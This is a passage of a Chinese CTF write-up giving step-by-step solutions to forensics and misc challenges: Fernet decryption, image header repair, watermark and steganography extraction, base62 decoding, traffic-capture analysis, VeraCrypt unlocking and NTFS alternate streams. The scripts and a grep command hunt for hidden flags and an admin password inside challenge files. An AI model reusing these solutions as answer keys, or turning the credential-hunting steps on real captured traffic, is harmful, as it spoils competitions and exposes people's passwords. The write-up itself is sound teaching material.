-<li><font style="color:rgba(0, 0, 0, 0.75);">Fernet 加密后，密文通常是 Base64 编码的，而你提供的字符串使用了 Base64 编码。Base64 编码的密文通常包含字母、数字以及字符 </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;+&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);">, </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;/&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);">, </font><code>&lt;font style=&quot;color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);&quot;&gt;=&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.75);">，这在你的密文中可以看到。</font></li>
-</ul>
-<ol start="2">
-<li><strong>Fernet 加密的结构</strong></li>
-</ol>
-<ul>
-<li>Fernet 加密的密文有一个特定的格式，由以下部分组成：</li>
-<li>版本：Fernet 的版本号，通常是一个字节（0x80），确保解密时使用正确的算法。</li>
-<li>时间戳：8 个字节的时间戳，记录加密的时间。</li>
-<li>加密数据：使用 AES 对称加密加密的实际数据。</li>
-<li>消息鉴别码 (MAC)：32 字节的 SHA256 HMAC，用于验证加密数据的完整性。</li>
-</ul>
-<ol start="3">
-<li>Fernet 密钥是 32 字节的 Base64 编码字符串，长度为 44 个字符。</li>
-</ol>
-<p>这些部分组合在一起，然后进行 Base64 编码，形成最终的加密字符串。Fernet 加密后的密文通常较长，且结构清晰，这正是典型的 Fernet 加密字符串的特征。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从 cryptography.fernet 导入 Fernet 类，用于加密和解密</span></span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 Fernet 对象，传入的密钥是用于加密/解密的对称密钥</span></span><br><span class="line"><span class="comment"># 这里的密钥是 base64 编码的字节串</span></span><br><span class="line">f = Fernet(<span class="string">b&#x27;Erj5UoZfpxT47Bjpg8qg1XmMCKZyKBj1bJ0otszVZPk=&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密后的密文，用 Fernet 加密生成的一串 base64 编码的字节串</span></span><br><span class="line">miwen = <span class="string">b&#x27;gAAAAABk2vY8KwxIv0n9XgVk8EPbQimR9iCqSX_crxcRSf-z2RV2rX2Ol1KHmbeAsxOyGR_i73vrl0FgLDCHHP9wWaXz37r5NmaWFXCwETQ2tYJM8vIFJVZ1Ptmtt2O7fXPQg6xA5-_dFOi-FYjF2RiqfXc39rbBLA==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 Fernet 对象 f 解密密文，得到原始明文并将其解码为字符串</span></span><br><span class="line">mingwen = f.decrypt(miwen).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印解密后的明文</span></span><br><span class="line"><span class="built_in">print</span>(mingwen)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740888810334-7dc084ab-604f-4f60-af6a-1136847b3d51.png"></p>
-<h2 id="snow"><a href="#snow" class="headerlink" title="snow"></a><font style="color:rgb(79, 79, 79);">snow</font></h2><p><strong><font style="color:rgb(77, 77, 77);">题目描述：</font></strong></p>
-<p><strong><font style="color:rgb(77, 77, 77);">你能找到隐藏在雪中的秘密吗？</font></strong></p>
-<p><strong><font style="color:rgb(77, 77, 77);"></font></strong></p>
-<p><font style="color:rgb(77, 77, 77);">文件最后有数据不对劲。</font></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740890961017-f3d5abf1-da1b-4513-b91a-f6af27441577.png"></p>
-<p>发现jpg文件尾：FF D9</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740891085949-194d1c55-a41b-43ce-ac5b-368c90bab1e9.png"></p>
-<p>尝试找文件头（这里binwalk没有显示jpg，不能直接提取）：</p>
-<p>寻找过程中看到了jpg关键信息，顺着找到了FF E1，而jpg头部是FF D8 FF E1，说明这里被出题人删了，我们手动改回去。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740891387431-e57aca3e-766b-4998-9d7e-b8f3d581eebc.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740891544626-9a41e565-dd70-4dd3-bd6f-8a93ba5c6794.png"></p>
-<p>保存好后，能看到底下有隐藏的数据，修改宽高。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740891582726-62e9d2f0-9b4e-4bf9-ad76-75232e0ac4e8.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740892108366-18b2642c-668d-45af-a1eb-a949e888b820.png"></p>
-<p>暂且不知道干嘛的，留着。</p>
-<p>想到刚刚提取出来的“JPG”格式图片既然与“PNG”格式一模一样，怀疑这可能就是“PNG“图片的单图盲水印，因为也就只有这种情况下，才会出现两个不一样格式但是内容相同的图片，所以这边我们直接上盲水印工具全部尝试一遍；</p>
-<p>“WaterMark”无发现；</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740892379926-0a1c11cb-2868-4ca1-9835-e9ae322efa8e.png"></p>
-<p>“imageIN_Beta1.0”，发现在解码中，有一个“txt”文件；</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740892397199-307913c4-5833-45a8-a95c-ac02082ca77a.png"><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740892513195-4dbcf0e8-3867-4c81-b19b-372db505a00e.png"></p>
-<p>明显是个压缩包。</p>
-<p>解压需要的密码就是图片上的。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740892585703-d389e0c8-009b-4c8e-acf1-ab26972125b4.png"></p>
-<h2 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h2><p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740892791151-8812571f-2e1d-4b22-8ea9-08f0d3bf7698.png"></p>
-<p>常规PDF缩小全选。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740892893700-4135f935-7312-4f36-ac84-813ee8ac483b.png"></p>
-<p>果然发现隐藏信息。直接ctrl+c复制一下。</p>
-<p>直接放到浏览器跑一下就好了，decode会显示什么无法alert。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740893259365-11d4047c-6505-4a04-8ca3-1d088eed3202.png"></p>
-<h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>发现不能直接解出来，但是题目说了这是base，肯定是某个base。我们去对照一下符合那个特征。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740963536810-5d06e3cc-287c-4847-b7d6-46f42d348189.png"></p>
-<p>发现和base62很符合，尝试解一下。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740963526161-c46fc5e1-e382-4aeb-a91c-1243b785283d.png"></p>
-<p>无果，这可能是由于拼接base62造成的，于是我们从后往前，挨个删除，直到能正确解码。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740963609736-a11efb64-e18e-40fa-8fe6-2cb6c59c90b6.png"></p>
-<p>成功发现flag头（其实也可以不需要知道是什么编码，直接挨个删除，厨子会识别的）。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740963770096-c6bec938-d702-4f8c-a2fc-e77d7cfddc8e.png"></p>
-<p>接下来把这段去掉重复操作：</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740963844589-1c4d7e37-d638-43e5-8e8e-7d6ac812a3cb.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740963856151-a3e58246-8fb7-4e36-901c-787757f8b71e.png"></p>
-<h2 id="流量分析-1"><a href="#流量分析-1" class="headerlink" title="流量分析"></a>流量分析</h2><p>常规操作，导出所有文件后，发现一个很大的。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740965251527-a27fba3b-a869-4be1-99bc-09c0eeccc7ab.png"></p>
-<p>结果不知道是什么（其实是tar.gz，那个1F 8B 08 00 00 00 00 00 00 03</p>
-<p>是文件头，做多了能看出来，当然这里没看出来，因为他开头还多了几个干扰）。</p>
-<p>这里多半有东西，我们用binwalk分析一下（好工具，现在才理解这工具的价值）</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740965278481-4658116f-800f-4bb9-90b9-a7ad4f0ba4d0.png"></p>
-<p>帮我们识别出了压缩包，解压一下看看</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740965379571-625a566b-1cae-4b49-9209-7d1c9718d863.png"></p>
-<p>现在我们要去这么多的文件中找admin的密码，肯定不能一个个找，尝试grep直接找关键字</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740965535392-84c21c32-0bc5-47c4-bb9c-6310b48c34a7.png"></p>
-<p>发现结果都是二进制文本，我们需要提取二进制文本中的字符串内容，然后再匹配。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740965852690-4084146d-8b92-451b-81c8-759cd3958e6f.png"></p>
-<p>find data -type f -exec bash -c ‘ strings {}|grep  admin’ ;</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740966071623-34d2b95b-e285-4959-8c56-b63025e13123.png"></p>
-<p>然后在这些结果中找到像密码的。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740966103017-2cae4a32-0e32-4d66-9e8e-d4338e41e016.png"></p>
-<h2 id="veee"><a href="#veee" class="headerlink" title="veee"></a>veee</h2><p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740966192552-3ac521ac-9b9c-4992-b381-539566f0b4a5.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740966209765-232a7589-2414-4a6f-b362-dae9f5030621.png"></p>
-<blockquote>
-<p>vera文件简介</p>
-<p>.vera 文件是 VeraCrypt 加密卷的文件格式之一。VeraCrypt 是一个开源的磁盘加密工具，用于保护数据的安全性和隐私性。.vera 文件通常代表了一个加密的容器或磁盘分区，用户可以将敏感文件保存在其中，确保数据在未解密的情况下无法被访问。</p>
-<p>.vera 文件的作用</p>
-<ol>
-<li>加密容器：.vera 文件充当了一个虚拟的加密硬盘，所有的数据都被加密存储在其中，外部无法直接读取或修改文件内容。</li>
-<li>保护敏感数据：通过密码或密钥保护，用户必须使用正确的密码或密钥才能访问加密卷内的文件和数据。</li>
-</ol>
-<p>使用 VeraCrypt 来挂载 .vera 文件</p>
-<p>为了访问 .vera 文件中的数据，必须使用 VeraCrypt 工具将该加密卷“挂载”到系统上。挂载之后，.vera 文件会被系统识别为一个虚拟磁盘，用户可以像访问普通磁盘一样查看和操作其中的文件。</p>
-<p>总结</p>
-<p>.vera 文件是 VeraCrypt 生成的加密卷文件，需通过 VeraCrypt 工具进行挂载后才能访问文件内容。</p>
-</blockquote>
-<p>第一个文件都是身份证，没什么好说的。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740966317010-96b0a4d2-6f3b-4312-8f2c-733388e8a0d5.png"></p>
-<p>第二个直接挂载：</p>
-<p>发现需要密码，这是经过加密的，怎么获取密码，看来就在上面的身份证上了。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740966688833-58f6dd16-4412-43f7-a6d7-d813d03970e0.png"></p>
-<blockquote>
-<p>身份证号码的结构</p>
-<p>中国的身份证号码主要有两种类型：</p>
-<p>15位身份证号码：用于老版身份证，格式为 XXXXXXYYYYYYZZZ。</p>
-<p>18位身份证号码：用于新版身份证，格式为 XXXXXXYYYYYYZZZZZZZZZ，其中最后一位是校验位。</p>
-<p>各部分的含义：</p>
-<p>XXXXXX：前六位表示行政区划码。</p>
-<p>YYYYYY：中间的八位表示出生日期（年、月、日）。</p>
-<p>ZZZZZZZZZ：后九位为顺序码，最后一位为校验位（可能是数字或字母X）。</p>
-<p>校验位的计算原理</p>
-<p>18位身份证的校验位是通过前17位数字计算得出的，计算方法如下：</p>
-<p>加权因子：每一位数字都有一个对应的权重。</p>
-<p>权重数组为：[7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]。</p>
-<p>校验码对应值：校验位的取值是根据模11的结果。</p>
-<p>对应值数组为：[1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2]。</p>
-<p>如果模值为10，则校验位为X（大写字母）。</p>
-<p>计算步骤：</p>
-<p>将前17位数字与对应的权重相乘，然后求和。</p>
-<p>将和对11取模，得到的结果用于查找校验码。</p>
-<p>那既然这样我们百度一个脚本来进行校验：</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断身份证号码是否合法的函数</span></span><br><span class="line">def <span class="title function_ invoke__">is_id_card</span>(id_card):</span><br><span class="line">    <span class="comment"># 正则表达式，用于验证身份证号格式（18位身份证）</span></span><br><span class="line">    reg_id_card = re.<span class="title function_ invoke__">compile</span>(r<span class="string">&#x27;^[1-9]\d&#123;5&#125;[1-9]\d&#123;3&#125;((0\d)|(1[0-2]))(([0|1|2]\d)|3[0-1])(\d&#123;3&#125;(\d|X|x))$&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用正则表达式进行初步验证</span></span><br><span class="line">    <span class="keyword">if</span> reg_id_card.<span class="keyword">match</span>(id_card):</span><br><span class="line">        <span class="comment"># 如果是18位身份证，进行校验码计算</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(id_card) == <span class="number">18</span>:</span><br><span class="line">            <span class="comment"># 加权因子，用于计算校验码</span></span><br><span class="line">            id_card_wi = [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line">            <span class="comment"># 校验码对应的值</span></span><br><span class="line">            id_card_y = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>]</span><br><span class="line">            <span class="comment"># 用于存储加权和</span></span><br><span class="line">            id_card_wi_sum = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算加权和</span></span><br><span class="line">            <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">17</span>):</span><br><span class="line">                id_card_wi_sum += <span class="keyword">int</span>(id_card[i]) * id_card_wi[i]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算出校验码的模数</span></span><br><span class="line">            id_card_mod = id_card_wi_sum % <span class="number">11</span></span><br><span class="line">            <span class="comment"># 获取身份证的最后一位（校验位）</span></span><br><span class="line">            id_card_last = id_card[<span class="number">17</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 如果模数是2，校验位可以是&quot;X&quot;或&quot;x&quot;</span></span><br><span class="line">            <span class="keyword">if</span> id_card_mod == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> id_card_last.<span class="title function_ invoke__">upper</span>() == <span class="string">&quot;X&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> True  <span class="comment"># 校验成功</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> False  <span class="comment"># 校验位错误</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 否则，校验位应与id_card_y数组中对应的值相等</span></span><br><span class="line">                <span class="keyword">if</span> id_card_last == <span class="title function_ invoke__">str</span>(id_card_y[id_card_mod]):</span><br><span class="line">                    <span class="keyword">return</span> True  <span class="comment"># 校验成功</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> False  <span class="comment"># 校验位错误</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 正则表达式验证不通过</span></span><br><span class="line">        <span class="keyword">return</span> False</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件中的身份证号码列表</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&#x27;./sfz.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        id_card_numbers = file.<span class="title function_ invoke__">readlines</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去除每一行的多余空格，并验证身份证号是否合法</span></span><br><span class="line">    invalid_ids = []  <span class="comment"># 存储不合法身份证号的最后一位</span></span><br><span class="line">    <span class="keyword">for</span> id_card_number in id_card_numbers:</span><br><span class="line">        id_card_number = id_card_number.<span class="title function_ invoke__">strip</span>()  <span class="comment"># 去掉首尾空白字符</span></span><br><span class="line">        <span class="keyword">if</span> id_card_number:</span><br><span class="line">            <span class="comment"># 调用 is_id_card 函数进行验证</span></span><br><span class="line">            <span class="keyword">if</span> not <span class="title function_ invoke__">is_id_card</span>(id_card_number):  <span class="comment"># 如果身份证号不合法</span></span><br><span class="line">                invalid_ids.<span class="title function_ invoke__">append</span>(id_card_number[-<span class="number">1</span>])  <span class="comment"># 保存不合法身份证号的最后一位</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出不合法身份证号的最后一位，不带空格</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&quot;</span>.<span class="title function_ invoke__">join</span>(invalid_ids))  <span class="comment"># 输出为一行，不带空格</span></span><br><span class="line"></span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;文件未找到，请检查文件路径是否正确。&quot;</span>)</span><br><span class="line">except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;出现错误：&quot;</span>, e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>脚本能够有效地验证输入的身份证号码是否符合国家标准。关键在于校验位的计算和格式验证。最终，输出的不合法身份证号码的最后一位可以帮助我们快速识别并处理问题。</p>
-</blockquote>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740966813736-64ada15c-80fe-4062-b4a0-078bbf786f67.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740966835712-b389c973-3fb5-4d19-a807-f91491b7d357.png"></p>
-<p>双击磁盘打开，即可看到假的flag。。。</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740966883013-e4220eb5-cdb6-4f43-b00e-4a19379d4df2.png"></p>
-<p>这是在考察NTFS数据流，</p>
-<blockquote>
-<p>在 NTFS 文件系统中，每个文件不仅仅只有一个数据流（即文件的主要内容），它还可以有多个备用数据流（Alternate Data Streams, ADS）。这些备用数据流允许文件包含额外的信息，而这些信息不会显示在传统的文件管理器或操作系统的常规视图中。</p>
-<p>举个例子，一个普通文件在 NTFS 中可能会有一个主要数据流（默认的文件内容），但它还可以附加一个或多个备用数据流，这些流不会直接显示在文件夹中，甚至通过普通的文件浏览器功能（如“显示隐藏项目”）也看不到。</p>
-</blockquote>
-<p>直接工具扫：</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740967442624-1aded9c9-b49a-436b-b523-514bf96189fb.png"></p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740967453191-10451579-32c0-4916-a31a-805f658f5163.png">	</p>
-<h2 id="seeme"><a href="#seeme" class="headerlink" title="seeme"></a><font style="color:rgb(79, 79, 79);">seeme</font></h2><p>一眼rgb转换,有脚本直接跑即可</p>
-<p><img src="/2025/03/25/%E9%A2%86%E8%88%AA%E6%9D%AF/1740967583319-548d296a-13e4-45f3-a2d5-7370d806732a.png"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL import Image, ImageEnhance</span><br><span class="line">import numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取像素值</span></span><br><span class="line">def <span class="title function_ invoke__">read_pixel_values_from_file</span>(filename):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        with <span class="title function_ invoke__">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            pixel_values = []</span><br><span class="line">            <span class="keyword">for</span> line in file:</span><br><span class="line">                values = line.<span class="title function_ invoke__">strip</span>().<span class="title function_ invoke__">split</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(values) != <span class="number">3</span>:</span><br><span class="line">                    raise <span class="title function_ invoke__">ValueError</span>(f<span class="string">&quot;每行必须包含 3 个值。错误行: &#123;line&#125;&quot;</span>)</span><br><span class="line">                pixel_values.<span class="title function_ invoke__">extend</span>(<span class="title function_ invoke__">map</span>(<span class="keyword">int</span>, values))</span><br><span class="line">            <span class="keyword">if</span> not pixel_values:</span><br><span class="line">                raise <span class="title function_ invoke__">ValueError</span>(<span class="string">&quot;文件内容为空或不符合要求。&quot;</span>)</span><br><span class="line">    except FileNotFoundError:</span><br><span class="line">        raise <span class="title function_ invoke__">FileNotFoundError</span>(f<span class="string">&quot;文件 &#123;filename&#125; 未找到。&quot;</span>)</span><br><span class="line">    except ValueError <span class="keyword">as</span> e:</span><br><span class="line">        raise <span class="title function_ invoke__">ValueError</span>(f<span class="string">&quot;读取文件时出错: &#123;e&#125;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> pixel_values</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建图像</span></span><br><span class="line">def <span class="title function_ invoke__">create_image_from_pixels</span>(pixel_values, width, height):</span><br><span class="line">    expected_pixel_count = width * height * <span class="number">3</span></span><br><span class="line">    actual_pixel_count = <span class="title function_ invoke__">len</span>(pixel_values)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> actual_pixel_count &gt; expected_pixel_count:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;像素值数量多于要求，截取前 &#123;expected_pixel_count&#125; 个像素值...&quot;</span>)</span><br><span class="line">        pixel_values = pixel_values[:expected_pixel_count]</span><br><span class="line">    elif actual_pixel_count &lt; expected_pixel_count:</span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;像素值数量少于要求，填充黑色像素...&quot;</span>)</span><br><span class="line">        pixel_values.<span class="title function_ invoke__">extend</span>([<span class="number">0</span>] * (expected_pixel_count - actual_pixel_count))</span><br><span class="line"></span><br><span class="line">    pixels = np.<span class="keyword">array</span>(pixel_values, dtype=np.uint8).<span class="title function_ invoke__">reshape</span>((height, width, <span class="number">3</span>))</span><br><span class="line">    image = Image.<span class="title function_ invoke__">fromarray</span>(pixels, <span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图像增强</span></span><br><span class="line">def <span class="title function_ invoke__">enhance_image</span>(image, brightness=<span class="number">1.5</span>, contrast=<span class="number">1.5</span>, color=<span class="number">1.2</span>):</span><br><span class="line">    def <span class="title function_ invoke__">apply_enhancement</span>(image, enhancement_type, factor):</span><br><span class="line">        enhancer = <span class="title function_ invoke__">enhancement_type</span>(image)</span><br><span class="line">        <span class="keyword">return</span> enhancer.<span class="title function_ invoke__">enhance</span>(factor)</span><br><span class="line"></span><br><span class="line">    image = <span class="title function_ invoke__">apply_enhancement</span>(image, ImageEnhance.Brightness, brightness)</span><br><span class="line">    image = <span class="title function_ invoke__">apply_enhancement</span>(image, ImageEnhance.Contrast, contrast)</span><br><span class="line">    image = <span class="title function_ invoke__">apply_enhancement</span>(image, ImageEnhance.Color, color)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line">def <span class="title function_ invoke__">main</span>():</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;欢迎使用像素到图像生成器!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    input_file = <span class="string">&quot;./file.txt&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>(f<span class="string">&quot;从 &#123;input_file&#125; 读取像素值...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pixel_values = <span class="title function_ invoke__">read_pixel_values_from_file</span>(input_file)</span><br><span class="line"></span><br><span class="line">        total_pixels = <span class="title function_ invoke__">len</span>(pixel_values) <span class="comment">// 3</span></span><br><span class="line">        <span class="keyword">print</span>(f<span class="string">&quot;总像素数: &#123;total_pixels&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 细化爆破 120 附近和 511 附近的宽度</span></span><br><span class="line">        refined_resolutions = <span 